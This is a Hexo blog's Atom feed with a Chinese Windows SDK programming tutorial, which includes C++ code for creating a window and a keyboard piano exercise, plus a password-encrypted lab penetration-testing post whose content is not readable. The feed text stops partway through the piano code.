<?xml version="1.0" encoding="utf-8"?>
<feed xmlns="http://www.w3.org/2005/Atom">
  <title>H4ckbird&#39;s Blog</title>
  <icon>https://www.gravatar.com/avatar/51a9f82d05f49451e3509af2b4abe068</icon>
  <subtitle>欲速则不达</subtitle>
  <link href="http://example.com/atom.xml" rel="self"/>
  
  <link href="http://example.com/"/>
  <updated>2022-11-25T11:04:23.171Z</updated>
  <id>http://example.com/</id>
  
  <author>
    <name>H4ckbird</name>
    <email>stupidbird6379@gmail.com</email>
  </author>
  
  <generator uri="https://hexo.io/">Hexo</generator>
  
  <entry>
    <title>好用的软件资源推荐</title>
    <link href="http://example.com/2022/11/25/%E5%A5%BD%E7%94%A8%E7%9A%84%E8%BD%AF%E4%BB%B6%E8%B5%84%E6%BA%90%E6%8E%A8%E8%8D%90/"/>
    <id>http://example.com/2022/11/25/%E5%A5%BD%E7%94%A8%E7%9A%84%E8%BD%AF%E4%BB%B6%E8%B5%84%E6%BA%90%E6%8E%A8%E8%8D%90/</id>
    <published>2022-11-25T11:02:09.000Z</published>
    <updated>2022-11-25T11:04:23.171Z</updated>
    
    <content type="html"><![CDATA[<link rel="stylesheet" class="aplayer-secondary-style-marker" href="\assets\css\APlayer.min.css"><script src="\assets\js\APlayer.min.js" class="aplayer-secondary-script-marker"></script>]]></content>
    
    
      
      
    <summary type="html">&lt;link rel=&quot;stylesheet&quot; class=&quot;aplayer-secondary-style-marker&quot; href=&quot;\assets\css\APlayer.min.css&quot;&gt;&lt;script src=&quot;\assets\js\APlayer.min.js&quot; cla</summary>
      
    
    
    
    <category term="资源" scheme="http://example.com/categories/%E8%B5%84%E6%BA%90/"/>
    
    
    <category term="软件推荐" scheme="http://example.com/tags/%E8%BD%AF%E4%BB%B6%E6%8E%A8%E8%8D%90/"/>
    
  </entry>
  
  <entry>
    <title>本地靶场渗透</title>
    <link href="http://example.com/2022/11/25/%E6%9C%AC%E5%9C%B0%E9%9D%B6%E5%9C%BA%E6%B8%97%E9%80%8F/"/>
    <id>http://example.com/2022/11/25/%E6%9C%AC%E5%9C%B0%E9%9D%B6%E5%9C%BA%E6%B8%97%E9%80%8F/</id>
    <published>2022-11-25T02:01:56.000Z</published>
    <updated>2022-11-25T02:05:18.118Z</updated>
    
    <content type="html"><![CDATA[<div class="hbe hbe-container" id="hexo-blog-encrypt" data-wpm="Oh, this is an invalid password. Check and try again, please." data-whm="OOPS, these decrypted content may changed, but you can still have a look.">  <script id="hbeData" type="hbeData" data-hmacdigest="9d4ff1de58239463b8487cf9be35204aeb5ab33636a27cb800a715591c8ba164">b3c9a99c0ccdca4a7128185684909d47be45d0719c2e3a0ca90370066c74e9863b24333f1e525c8e1bb2268ef9b7b46aa3b07067fbf1ef6e2e63030f6510823dea5ceda2b59996f3b00a070a4e36468698d5dc22fab8a7781cd1f1d268071adccef47d36c8c48fc29deb7e9233baf7a74fd7c1a7e26383df617d160d6620f838db98ae80c3d518f06c03f25222b89f4325cafa413082b2e9cf493e613296789d4d5b3de93dbcf34a3b2b699634d06a34802c74af590182b7696d5001558d36013d8ae655c764077fc819b8d0eefdaf86185452e3e300e74da80eeb3893805b8ad331a3b973b691ea04a41c50892376c73638394d2f59f9650440be996e841a9f1ecd01b337e8821842006b6ebbb389cea1f4088f45cac1ba5528b25e7367ca07311b3597eb0dc4cf5b2dc7bca4897df5b9dfa7eef6e08190e2dc6469a25f72d7aea7e34eb44c98297f2695f46089ef09a532deb997c93505f634765c3a8a2f911bd618e6d4b60e1eab94227566da4a9cd1fe9005b25cac9a4766176568d4f672e8e72a7bdc0af4955881dcdf146cc558a5ca1af71c2e839ed0fe2bd879a6d04c073e3c7ed833820ae7a8983518b68a4b36c82c043e7f40992b19515d6e14bf18f7f8cba7e083375dcc60ccf9fbb0dc2bf7c05b67566a95bb78b0a057153563195cfe4585104697d5b4458797b68654ac939b28f55121a3bfafaf71f476f8fe006a32f5c0b0eea115f2df20e05981a6e86f5b1fa5cea89c1b20b7622b7405fbd597325ed8583257114156126199e6656254a654fa817a85ab25379e24d7b50adfb2a700a4ef0236d99dfc439f4f9d05d2ff5cfda1e927c09e8aa02c00e6619cdea453ea4968c9eeda1b6c9d82dead345f187cfd85d96b553fca0908bc74dc5ae0aa2b07939d89043261cde48a26941fd5735c9ba1aea961698d1473d76b74e9af94ade35d317400171abeef9e9d5791dd61b901fb9f2a1f0ee4a4a4c37bd4c80b272f23c69a4626adfa4331e246521f04aefc3a3a242c076414ecdc6ab44aefba7fe47ccdae7584c1b4c2e8ab5307c4284d25e349eb0ad61d680c0e2eac86c48eae87efb2e2643df57deae22ab48004e6</script>  <div class="hbe hbe-content">    <div class="hbe hbe-input hbe-input-default">      <input class="hbe hbe-input-field hbe-input-field-default" type="password" id="hbePass">      <label class="hbe hbe-input-label hbe-input-label-default" for="hbePass">        <span class="hbe hbe-input-label-content hbe-input-label-content-default">暂时不对普通用户开放</span>      </label>    </div>  </div></div><script data-pjax src="/lib/hbe.js"></script><link href="/css/hbe.style.css" rel="stylesheet" type="text/css">]]></content>
    
    
    <summary type="html">渗透测试简单学习</summary>
    
    
    
    <category term="渗透测试" scheme="http://example.com/categories/%E6%B8%97%E9%80%8F%E6%B5%8B%E8%AF%95/"/>
    
    
    <category term="靶场渗透" scheme="http://example.com/tags/%E9%9D%B6%E5%9C%BA%E6%B8%97%E9%80%8F/"/>
    
  </entry>
  
  <entry>
    <title>Windows-SDK</title>
    <link href="http://example.com/2022/11/24/Windows-SDK/"/>
    <id>http://example.com/2022/11/24/Windows-SDK/</id>
    <published>2022-11-24T08:27:52.000Z</published>
    <updated>2022-11-24T08:53:09.011Z</updated>
    
    <content type="html"><![CDATA[<link rel="stylesheet" class="aplayer-secondary-style-marker" href="\assets\css\APlayer.min.css"><script src="\assets\js\APlayer.min.js" class="aplayer-secondary-script-marker"></script><p>[TOC]</p><h1 id="Windows窗口的创建流程"><a href="#Windows窗口的创建流程" class="headerlink" title="Windows窗口的创建流程"></a>Windows窗口的创建流程</h1><h2 id="注册一个窗口类"><a href="#注册一个窗口类" class="headerlink" title="注册一个窗口类"></a>注册一个窗口类</h2><p>RegisterClass</p><p>1.1、提供一个消息处理函数（窗口回调函数）</p><p>1.2、提供一个窗口类的名字</p><h2 id="创建一个窗口"><a href="#创建一个窗口" class="headerlink" title="创建一个窗口"></a>创建一个窗口</h2><p> GreateWindow 能够创建一个窗口，得到一个窗口句柄，是系统找到串口的一个标识</p><h2 id="更新显示窗口"><a href="#更新显示窗口" class="headerlink" title="更新显示窗口"></a>更新显示窗口</h2><p>UpdateWindow（更新）</p><p>Show Window（显示）</p><h2 id="编写一个消息循环"><a href="#编写一个消息循环" class="headerlink" title="编写一个消息循环"></a>编写一个消息循环</h2><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">While(GetMessage)(…))&#123;</span><br><span class="line">TranslateMessage();</span><br><span class="line">DispatchMessage(…);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><h2 id="编写一个消息处理函数（窗口回调函数）"><a href="#编写一个消息处理函数（窗口回调函数）" class="headerlink" title="编写一个消息处理函数（窗口回调函数）"></a>编写一个消息处理函数（窗口回调函数）</h2><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">DWORD WINAPI WndProc(HWND hWnd,int nMessage,WPARAM wParam,LPARAM lParam)&#123;</span><br><span class="line">Switch(message)&#123;</span><br><span class="line">&#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p><strong>问题1：*</strong>怎么理解这一些代码，这个过程这段代码，是定形式，是微软规定好的流程*</p><p><strong>问题2：*</strong>消息是怎么获取到的*</p><p>只有窗口才能够收消息，窗口收的息，需要通过 GetMessage来从程序的消息队列中获取到。你需要创建一个窗口，然后在创建窗口之后就可以使用 GetMessage获得创建的窗口收到的消息</p><p><strong>问题3：*</strong>消息队列在哪里，我为什么看不到？？*</p><p>因为大部分的事情都是操作系统帮你完成了比如说消息队列，比如往消息队列添加消息，从消息队列中得到消息，删除已经得到的</p><p><strong>问题4：*</strong>什么是回调函数？谁调用了回调函数？*</p><p>回调函数就不是你调用的函数你提供了一个函数给操作系统，操作系统在合适的时机去调用你提供的函数。因为只有操作系统才能知道什么时候得到了消息，只有我才知道我的程序怎么处理消息</p><p><strong>问题5：*</strong>为什么创建窗口要先注册窗口类？为什么创建完窗口要写更新显示窗口？为什么消息循环要写 tMessage DispatchMessage并放在一个循环里面？？*需要先有一个板（窗口共有一些特性，放在窗口类里面），然后创建窗口的时候根据模板去创建</p><p>刚创建出来的窗口是隐藏起来的，比如 ShowWindow给显示出来， UpdateWindow能够让窗口产生一次自绘（WMPAINT）</p><p>的作用就是从滴息队列中获取消息</p><p>DispatchMessage的作用就是调用口相对应的回调函数</p><figure class="highlight c++"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br><span class="line">85</span><br><span class="line">86</span><br><span class="line">87</span><br><span class="line">88</span><br><span class="line">89</span><br><span class="line">90</span><br><span class="line">91</span><br><span class="line">92</span><br><span class="line">93</span><br><span class="line">94</span><br><span class="line">95</span><br><span class="line">96</span><br><span class="line">97</span><br><span class="line">98</span><br><span class="line">99</span><br><span class="line">100</span><br><span class="line">101</span><br><span class="line">102</span><br><span class="line">103</span><br><span class="line">104</span><br><span class="line">105</span><br><span class="line">106</span><br><span class="line">107</span><br><span class="line">108</span><br><span class="line">109</span><br><span class="line">110</span><br><span class="line">111</span><br><span class="line">112</span><br><span class="line">113</span><br><span class="line">114</span><br><span class="line">115</span><br><span class="line">116</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;windows.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;stdio.h&gt;</span></span></span><br><span class="line"><span class="comment">//用于在调试窗口输出信息</span></span><br><span class="line"><span class="function"><span class="type">bool</span> <span class="title">trace</span><span class="params">(CONST TCHAR* format, ...)</span><span class="comment">//变参函数</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">TCHAR buffer[<span class="number">1000</span>];</span><br><span class="line">va_list argptr;</span><br><span class="line"><span class="built_in">va_start</span>(argptr,format);</span><br><span class="line"><span class="comment">//将格式化信息写入指定缓冲区</span></span><br><span class="line"><span class="built_in">wvsprintf</span>(buffer, format, argptr);</span><br><span class="line"><span class="built_in">va_end</span>(argptr);</span><br><span class="line"><span class="comment">//将缓冲区信息输出</span></span><br><span class="line"><span class="built_in">OutputDebugString</span>(buffer);</span><br><span class="line"><span class="keyword">return</span> <span class="literal">true</span>;</span><br><span class="line">&#125;</span><br><span class="line"><span class="comment">//必须提供窗口回调函数</span></span><br><span class="line"><span class="function">LRESULT CALLBACK <span class="title">WndProc</span><span class="params">(</span></span></span><br><span class="line"><span class="params"><span class="function">HWND hWnd,<span class="comment">//哪个串口的消息</span></span></span></span><br><span class="line"><span class="params"><span class="function">UINT uMsg,<span class="comment">//消息的类型</span></span></span></span><br><span class="line"><span class="params"><span class="function">WPARAM wParam,</span></span></span><br><span class="line"><span class="params"><span class="function">LPARAM lParam<span class="comment">//消息的附加参数</span></span></span></span><br><span class="line"><span class="params"><span class="function">)</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line"><span class="comment">//使用分支语句处理要操作的消息</span></span><br><span class="line"><span class="keyword">switch</span> (uMsg)</span><br><span class="line">&#123;</span><br><span class="line"><span class="keyword">case</span> WM_CREATE:<span class="comment">//窗口创建消息，第一个被产生 的消息</span></span><br><span class="line">&#123;</span><br><span class="line"><span class="built_in">MessageBox</span>(hWnd, <span class="string">L&quot;打开成功&quot;</span>, <span class="string">L&quot;标题&quot;</span>, MB_OK);</span><br><span class="line"><span class="keyword">break</span>;</span><br><span class="line">&#125;</span><br><span class="line"><span class="comment">//右上角关闭按钮</span></span><br><span class="line"><span class="keyword">case</span> WM_CLOSE:</span><br><span class="line">&#123;</span><br><span class="line"><span class="built_in">MessageBox</span>(hWnd, <span class="string">L&quot;确认是否关闭&quot;</span>, <span class="string">L&quot;提示&quot;</span>, MB_OK);</span><br><span class="line"><span class="comment">//销毁当前窗口</span></span><br><span class="line"><span class="built_in">DestroyWindow</span>(hWnd);</span><br><span class="line"><span class="comment">//结束消息循环</span></span><br><span class="line"><span class="built_in">PostQuitMessage</span>(<span class="number">0</span>);</span><br><span class="line"><span class="keyword">break</span>;</span><br><span class="line">&#125;</span><br><span class="line"><span class="comment">//窗口移动消息，移动窗口位置响应</span></span><br><span class="line"><span class="keyword">case</span> WM_MOVE:</span><br><span class="line">&#123;</span><br><span class="line"><span class="comment">//lParam保存左上角坐标</span></span><br><span class="line">WORD x = <span class="built_in">LOWORD</span>(lParam);</span><br><span class="line">WORD y = <span class="built_in">HIWORD</span>(lParam);</span><br><span class="line"><span class="built_in">trace</span>(<span class="string">L&quot;POS(%d,%d)\n&quot;</span>, x, y);</span><br><span class="line"><span class="keyword">break</span>;</span><br><span class="line">&#125;</span><br><span class="line"><span class="keyword">default</span>:</span><br><span class="line"><span class="keyword">break</span>;</span><br><span class="line">&#125;</span><br><span class="line"><span class="comment">//将不想处理的消息传递给这个函数，进行默认参数</span></span><br><span class="line"><span class="keyword">return</span> <span class="built_in">DefWindowProc</span>(hWnd,uMsg,wParam,lParam);</span><br><span class="line">&#125;</span><br><span class="line"><span class="function"><span class="type">void</span> <span class="title">prin</span><span class="params">()</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line"><span class="built_in">trace</span>(<span class="string">L&quot;一次调用&quot;</span>);</span><br><span class="line">&#125;</span><br><span class="line"><span class="function"><span class="type">int</span> WINAPI <span class="title">WinMain</span><span class="params">(</span></span></span><br><span class="line"><span class="params"><span class="function">_In_ HINSTANCE hInstance,<span class="comment">//实例句柄，表示当前应用程序，用于获取资源</span></span></span></span><br><span class="line"><span class="params"><span class="function">_In_ HINSTANCE hPrevInstance,<span class="comment">//句柄，标识上一个打开的应用程序</span></span></span></span><br><span class="line"><span class="params"><span class="function">_In_opt_ LPSTR lpCmdLine,<span class="comment">//命令行参数，对应的是main函数的argv参数</span></span></span></span><br><span class="line"><span class="params"><span class="function">_In_ <span class="type">int</span> nCmdShow<span class="comment">//显示方式，最大化最小化</span></span></span></span><br><span class="line"><span class="params"><span class="function">)</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line"><span class="built_in">prin</span>();</span><br><span class="line"><span class="comment">//1、创建窗口类，</span></span><br><span class="line">WNDCLASS WnsClass = &#123;<span class="number">0</span>&#125;;<span class="comment">//窗口结构体初始化为0</span></span><br><span class="line">WnsClass.lpfnWndProc = WndProc;<span class="comment">//一个回调函数的地址</span></span><br><span class="line">WnsClass.lpszClassName = <span class="string">L&quot;myclass&quot;</span>;<span class="comment">//结构体名字，表示当前的窗口，由于是宽字符</span></span><br><span class="line">WnsClass.hCursor = <span class="built_in">LoadCursor</span>(<span class="literal">NULL</span>, IDC_ARROW);<span class="comment">//使用默认光标</span></span><br><span class="line">WnsClass.style = CS_VREDRAW | CS_HREDRAW;<span class="comment">//窗口改变大小后重绘制</span></span><br><span class="line">WnsClass.hInstance = hInstance;<span class="comment">//标识当前应用程序</span></span><br><span class="line">WnsClass.hIcon = <span class="built_in">LoadIcon</span>(<span class="literal">NULL</span>,IDI_APPLICATION);<span class="comment">//使用默认图标</span></span><br><span class="line">WnsClass.hbrBackground = <span class="built_in">CreateSolidBrush</span>(<span class="built_in">RGB</span>(<span class="number">0</span>, <span class="number">0xff</span>, <span class="number">0</span>));<span class="comment">//背景颜色</span></span><br><span class="line">WnsClass.cbWndExtra = WnsClass.cbClsExtra = <span class="number">0</span>;<span class="comment">//扩展，几乎没有用</span></span><br><span class="line"></span><br><span class="line"><span class="comment">//2、注册已经注册好的窗口，注册后的窗口才能使用</span></span><br><span class="line"><span class="keyword">if</span> (<span class="number">0</span> == <span class="built_in">RegisterClass</span>(&amp;WnsClass))<span class="comment">//传入需要注册的结构体地址</span></span><br><span class="line">&#123;</span><br><span class="line"><span class="built_in">MessageBox</span>(<span class="literal">NULL</span>, <span class="string">L&quot;打开失败&quot;</span>, <span class="string">L&quot;错误&quot;</span>, MB_OK | MB_ICONERROR);</span><br><span class="line"><span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">&#125;</span><br><span class="line"><span class="comment">//3通过设置好的窗口来创建</span></span><br><span class="line">HWND hWnd=<span class="built_in">CreateWindow</span>(<span class="comment">//返回值是一个窗口句柄</span></span><br><span class="line"><span class="string">L&quot;myclass&quot;</span>,<span class="comment">//使用注册好的窗口类</span></span><br><span class="line"><span class="string">L&quot;第一个窗口&quot;</span>,<span class="comment">//窗口的显示名称</span></span><br><span class="line">WS_OVERLAPPEDWINDOW,<span class="comment">//窗口显示类型：重叠窗口</span></span><br><span class="line">CW_USEDEFAULT, <span class="number">0</span>,<span class="comment">//窗口左上角的坐标，使用CW_USEDEFAULT,可以省略y</span></span><br><span class="line">CW_USEDEFAULT, <span class="number">0</span>,<span class="comment">//窗口的高度和宽度，使用CW_USEDEFAULT，可以省略宽度</span></span><br><span class="line"><span class="literal">NULL</span>,<span class="comment">//当前的窗口的副窗口</span></span><br><span class="line"><span class="literal">NULL</span>,<span class="comment">//菜单句柄，标识当前使用哪个菜单</span></span><br><span class="line">hInstance,<span class="comment">//实例句柄，表示当前窗口属于哪个应用程序</span></span><br><span class="line"><span class="number">0</span></span><br><span class="line">);</span><br><span class="line"></span><br><span class="line"><span class="comment">//4、显示并更新窗口</span></span><br><span class="line"><span class="built_in">ShowWindow</span>(hWnd, SW_SHOWNORMAL);<span class="comment">//默认不显示，所以，我们需要手动显示</span></span><br><span class="line"><span class="built_in">UpdateWindow</span>(hWnd);</span><br><span class="line"></span><br><span class="line"><span class="comment">//5、编写消息循环</span></span><br><span class="line">MSG msg = &#123; <span class="number">0</span> &#125;;<span class="comment">//保存消息的结构体</span></span><br><span class="line"><span class="keyword">while</span> (<span class="built_in">GetMessage</span>(</span><br><span class="line">&amp;msg,<span class="comment">//保存信息来源的结构体</span></span><br><span class="line"><span class="literal">NULL</span>,<span class="comment">//窗口句柄，指定当前接收哪个窗口的消息，NULL表示所有</span></span><br><span class="line"><span class="number">0</span>,<span class="number">0</span>))<span class="comment">//表示想要接收消息的范围0，表示所有</span></span><br><span class="line">&#123;</span><br><span class="line"><span class="comment">//将消息结构体中的前四个参数传递给对应窗口类中填写 的回调函数</span></span><br><span class="line"><span class="built_in">DispatchMessage</span>(&amp;msg);</span><br><span class="line"></span><br><span class="line"><span class="comment">//</span></span><br><span class="line">&#125;</span><br><span class="line"><span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><h1 id="二、练习题"><a href="#二、练习题" class="headerlink" title="二、练习题"></a>二、练习题</h1><h2 id="题：钢琴"><a href="#题：钢琴" class="headerlink" title="题：钢琴"></a>题：钢琴</h2><p>描述：使用所提供的音乐资源写出可以根据按键弹奏播放对应的曲调</p><p>进阶：本地提供一个钢琴谱，根据琴谱自动弹奏</p><h3 id="main-cpp-主函数"><a href="#main-cpp-主函数" class="headerlink" title="main.cpp//主函数"></a>main.cpp//主函数</h3><figure class="highlight c++"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br><span class="line">85</span><br><span class="line">86</span><br><span class="line">87</span><br><span class="line">88</span><br><span class="line">89</span><br><span class="line">90</span><br><span class="line">91</span><br><span class="line">92</span><br><span class="line">93</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;Windows.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&quot;Data.h&quot;</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">pragma</span> comment(lib,<span class="string">&quot;winmm.lib&quot;</span>)</span></span><br><span class="line"><span class="comment">//用宏自定义消息类型</span></span><br><span class="line"><span class="meta">#<span class="keyword">define</span> UM_MYMESSAGE WM_USER+1</span></span><br><span class="line"><span class="comment">//声明</span></span><br><span class="line"><span class="function">LRESULT CALLBACK <span class="title">WndProc</span><span class="params">(HWND hWnd,UINT uMsg,WPARAM wParam,LPARAM lParam)</span></span>;</span><br><span class="line"><span class="function"><span class="type">void</span> <span class="title">en_zch</span><span class="params">()</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line"><span class="comment">//设置英文输入法</span></span><br><span class="line"><span class="built_in">keybd_event</span>(VK_SHIFT, <span class="number">0</span>, <span class="number">0</span>, <span class="number">0</span>);</span><br><span class="line"><span class="built_in">Sleep</span>(<span class="number">100</span>);</span><br><span class="line"><span class="built_in">keybd_event</span>(VK_SHIFT, <span class="number">0</span>, KEYEVENTF_KEYUP, <span class="number">0</span>);</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="function"><span class="type">int</span> WINAPI <span class="title">WinMain</span><span class="params">(HINSTANCE hInstance,HINSTANCE hPronstance, LPSTR lpCmdLine,<span class="type">int</span> nCmdShow)</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line"><span class="comment">//注册窗口</span></span><br><span class="line">WNDCLASS ws = &#123;<span class="number">0</span>&#125;;</span><br><span class="line">ws.lpfnWndProc= WndProc;</span><br><span class="line">ws.hInstance=hInstance;</span><br><span class="line">ws.lpszClassName = <span class="string">L&quot;piano&quot;</span>;</span><br><span class="line"><span class="built_in">RegisterClass</span>(&amp;ws);</span><br><span class="line"><span class="comment">//创建窗口</span></span><br><span class="line">HWND hwnd=<span class="built_in">CreateWindow</span>(<span class="string">L&quot;piano&quot;</span>, <span class="string">L&quot;钢琴&quot;</span>, WS_OVERLAPPEDWINDOW , <span class="number">500</span>, <span class="number">500</span>, <span class="number">800</span>, <span class="number">800</span>, <span class="literal">NULL</span>, <span class="literal">NULL</span>, hInstance, <span class="number">0</span>);</span><br><span class="line"><span class="comment">//更新显示窗口</span></span><br><span class="line"><span class="built_in">UpdateWindow</span>(hwnd);</span><br><span class="line"><span class="built_in">ShowWindow</span>(hwnd,SW_SHOWNORMAL);</span><br><span class="line"><span class="comment">//消息泵</span></span><br><span class="line">MSG msg = &#123; <span class="number">0</span> &#125;;</span><br><span class="line"><span class="keyword">while</span> (<span class="built_in">GetMessage</span>(&amp;msg,<span class="number">0</span>,<span class="number">0</span>,<span class="number">0</span>))</span><br><span class="line">&#123;</span><br><span class="line"><span class="built_in">DispatchMessage</span>(&amp;msg);</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="comment">//必须提供窗口回调函数</span></span><br><span class="line"><span class="function">LRESULT CALLBACK <span class="title">WndProc</span><span class="params">(</span></span></span><br><span class="line"><span class="params"><span class="function">HWND hWnd,<span class="comment">//哪个串口的消息</span></span></span></span><br><span class="line"><span class="params"><span class="function">UINT uMsg,<span class="comment">//消息的类型</span></span></span></span><br><span class="line"><span class="params"><span class="function">WPARAM wParam,<span class="comment">//虚拟键值</span></span></span></span><br><span class="line"><span class="params"><span class="function">LPARAM lParam<span class="comment">//消息的附加参数</span></span></span></span><br><span class="line"><span class="params"><span class="function">)</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line"><span class="comment">//创建Data对象</span></span><br><span class="line">Data obj;</span><br><span class="line"><span class="comment">//使用分支语句处理要操作的消息</span></span><br><span class="line"><span class="keyword">switch</span> (uMsg)</span><br><span class="line">&#123;</span><br><span class="line"><span class="keyword">case</span> WM_CREATE:</span><br><span class="line">&#123;<span class="comment">//开场音乐</span></span><br><span class="line"><span class="built_in">PlaySoundA</span>(<span class="string">&quot;D:\\Project\\WIN_MAIN\\PIANO\\Sound\\LoopyMusic.wav&quot;</span>, <span class="literal">NULL</span>, SND_ASYNC | SND_NODEFAULT);</span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span> (obj.<span class="built_in">ReadData</span>(hWnd))</span><br><span class="line">&#123;</span><br><span class="line"><span class="built_in">MessageBox</span>(hWnd, <span class="string">L&quot;检测到你有琴谱，是否播放&quot;</span>, <span class="string">L&quot;提示&quot;</span>, MB_OK|MB_OKCANCEL);</span><br><span class="line"><span class="built_in">PostMessage</span>(hWnd, UM_MYMESSAGE,<span class="number">0</span>,<span class="number">0</span>);<span class="comment">//给自定义消息发送</span></span><br><span class="line">&#125;</span><br><span class="line"><span class="keyword">break</span>;</span><br><span class="line">&#125;</span><br><span class="line"><span class="comment">//自定义响应消息</span></span><br><span class="line"><span class="keyword">case</span> UM_MYMESSAGE:</span><br><span class="line">&#123;</span><br><span class="line"><span class="keyword">for</span> (<span class="type">int</span> i = <span class="number">0</span>; i &lt; <span class="built_in">sizeof</span>(Data::Souce); i++)</span><br><span class="line">&#123;</span><br><span class="line">obj.<span class="built_in">If_Case</span>(Data::Souce[i]);</span><br><span class="line">&#125;</span><br><span class="line"><span class="keyword">break</span>;</span><br><span class="line">&#125;</span><br><span class="line"><span class="comment">//右上角关闭按钮</span></span><br><span class="line"><span class="keyword">case</span> WM_CLOSE:</span><br><span class="line">&#123;</span><br><span class="line"><span class="built_in">MessageBox</span>(hWnd, <span class="string">L&quot;是否退出钢琴&quot;</span>, <span class="string">L&quot;提示&quot;</span>, MB_OK);</span><br><span class="line"><span class="comment">//销毁当前窗口</span></span><br><span class="line"><span class="built_in">DestroyWindow</span>(hWnd);</span><br><span class="line"><span class="comment">//结束消息循环</span></span><br><span class="line"><span class="built_in">PostQuitMessage</span>(<span class="number">0</span>);</span><br><span class="line"><span class="keyword">break</span>;</span><br><span class="line">&#125;</span><br><span class="line"><span class="comment">//按键按下响应</span></span><br><span class="line"><span class="keyword">case</span> WM_KEYDOWN:</span><br><span class="line">&#123;</span><br><span class="line">obj.<span class="built_in">If_Case</span>(wParam);</span><br><span class="line">&#125;</span><br><span class="line"><span 